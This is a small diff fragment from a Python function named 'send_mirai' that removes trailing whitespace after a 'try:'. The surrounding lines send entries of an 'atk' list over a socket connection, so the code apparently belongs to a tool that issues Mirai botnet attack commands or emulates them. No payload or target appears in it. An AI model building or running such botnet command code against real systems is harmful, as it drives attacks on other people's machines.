@@ -48,7 +48,7 @@ def send_mirai(c):
                 print('Exception: ' + str(e))
                 break
         elif data[:1] != '\x00':
-            try: 
+            try:
                 c.send(atk[id])
                 print('\033[91msend: \033[00m', atk[id])
                 time.sleep(3)
